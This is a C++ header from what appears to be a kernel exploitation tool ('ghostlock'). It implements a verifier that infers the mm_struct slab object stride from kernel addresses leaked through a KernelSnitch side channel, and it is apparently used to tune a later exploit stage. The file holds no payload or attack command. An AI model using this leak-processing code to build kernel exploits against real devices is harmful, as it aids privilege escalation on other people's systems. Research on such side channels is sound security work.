#ifndef KERNELSNITCH_STRIDE_VERIFY_H
#define KERNELSNITCH_STRIDE_VERIFY_H

#include <algorithm>
#include <array>
#include <cstddef>
#include <numeric>

/*
 * The slab-stride verifier.
 *
 * After a KernelSnitch leak the address is a real mm_struct object start in
 * its order-3 slab, so its offset inside the 32 KiB slab (leaked & 0x7fff)
 * is j * stride for some object index j. Every clean round casts one vote
 * for each candidate stride that divides its offset.
 *
 * The candidate window is the 64-byte grid in [800, 1400]: mm_struct is
 * created with SLAB_HWCACHE_ALIGN and the arm64 cache line is 64 B, so the
 * SLUB object stride is a multiple of 64. The upper bound stays below twice
 * the lower bound, so no candidate in the window divides another.
 *
 * There is no vote threshold: the verifier reports every candidate that
 * received at least one vote, its count, and the per-round offsets. The
 * generation UI shows that table and the user picks. A round whose offset
 * is zero (the object sits at the slab base) carries no stride information
 * and is excluded from the denominator.
 */

namespace ghostlock::kernelsnitch {
    inline constexpr std::size_t STRIDE_WINDOW_MIN = 800;
    inline constexpr std::size_t STRIDE_WINDOW_MAX = 1400;
    inline constexpr std::size_t STRIDE_GRID = 64;
    inline constexpr std::size_t STRIDE_MAX_ROUNDS = 10;
    /* One round gives a verdict only when the validator's rare false match is
     * ignored; two independent leaks are the documented consistency floor. */
    inline constexpr std::size_t STRIDE_MIN_SAMPLES = 2;

    /* The number of 64-multiples in the window: 832, 896, ..., 1344. */
    inline constexpr std::size_t STRIDE_MAX_CANDIDATES = 9;

    constexpr std::size_t stride_grid_ceil(std::size_t value) {
        return ((value + STRIDE_GRID - 1) / STRIDE_GRID) * STRIDE_GRID;
    }

    struct StrideCandidateVote {
        std::size_t value;
        std::size_t votes;
    };

    class StrideVerifier {
    public:
        /* `sizeof_mm` floors the window when the Image gives the struct size;
         * zero means unknown and the whole window is used. */
        explicit StrideVerifier(std::size_t sizeof_mm = 0) : floor_(sizeof_mm) {}

        bool add_offset(std::size_t offset) {
            if (rounds_ == STRIDE_MAX_ROUNDS) return false;
            offsets_[rounds_++] = offset;
            return true;
        }

        std::size_t rounds() const { return rounds_; }

        /* Nonzero rounds: the denominator the UI shows next to a vote count. */
        std::size_t samples() const {
            std::size_t n = 0;
            for (std::size_t i = 0; i < rounds_; ++i)
                if (offsets_[i] != 0) ++n;
            return n;
        }

        std::size_t offset(std::size_t round) const {
            return round < rounds_ ? offsets_[round] : 0;
        }

        /* The gcd of the nonzero offsets; the true stride divides it. */
        std::size_t gcd() const {
            std::size_t g = 0;
            for (std::size_t i = 0; i < rounds_; ++i) {
                if (offsets_[i] == 0) continue;
                g = std::gcd(g, offsets_[i]);
            }
            return g;
        }

        std::size_t window_size() const {
            const std::size_t first = first_candidate();
            if (first > STRIDE_WINDOW_MAX) return 0;
            return (STRIDE_WINDOW_MAX - first) / STRIDE_GRID + 1;
        }

        std::size_t window_value(std::size_t index) const {
            return first_candidate() + index * STRIDE_GRID;
        }

        std::size_t votes_for(std::size_t value) const {
            if (value < first_candidate() || value > STRIDE_WINDOW_MAX ||
                value % STRIDE_GRID != 0)
                return 0;
            std::size_t votes = 0;
            for (std::size_t i = 0; i < rounds_; ++i)
                if (offsets_[i] != 0 && offsets_[i] % value == 0) ++votes;
            return votes;
        }

        /* The number of candidates with at least one vote. */
        std::size_t voted_count() const {
            std::size_t n = 0;
            for (std::size_t i = 0; i < window_size(); ++i)
                if (votes_for(window_value(i)) != 0) ++n;
            return n;
        }

        /* Voted candidates sorted by votes descending, then value ascending.
         * Returns {0, 0} past the end. */
        StrideCandidateVote voted(std::size_t index) const {
            std::array<StrideCandidateVote, STRIDE_MAX_CANDIDATES> table{};
            std::size_t n = 0;
            for (std::size_t i = 0; i < window_size(); ++i) {
                const std::size_t value = window_value(i);
                const std::size_t votes = votes_for(value);
                if (votes != 0) table[n++] = {value, votes};
            }
            std::sort(table.begin(), table.begin() + n,
                      [](const StrideCandidateVote &a,
                         const StrideCandidateVote &b) {
                          if (a.votes != b.votes) return a.votes > b.votes;
                          return a.value < b.value;
                      });
            return index < n ? table[index] : StrideCandidateVote{0, 0};
        }

        /* One candidate holds every nonzero vote; the probe may stop early.
         * A tie between two unanimous candidates is not decided. */
        bool decided() const {
            const std::size_t n = samples();
            if (n < STRIDE_MIN_SAMPLES) return false;
            std::size_t unanimous = 0;
            for (std::size_t i = 0; i < window_size(); ++i)
                if (votes_for(window_value(i)) == n) ++unanimous;
            return unanimous == 1;
        }

        bool any_votes() const { return voted_count() != 0; }

        std::size_t best_value() const { return voted(0).value; }

        std::size_t best_votes() const { return voted(0).votes; }

        std::size_t floor_value() const { return floor_; }

    private:
        std::size_t first_candidate() const {
            std::size_t lower = STRIDE_WINDOW_MIN;
            if (floor_ > lower) lower = floor_;
            return stride_grid_ceil(lower);
        }

        std::size_t floor_;
        std::size_t rounds_ = 0;
        std::array<std::size_t, STRIDE_MAX_ROUNDS> offsets_{};
    };
} // namespace ghostlock::kernelsnitch

#endif
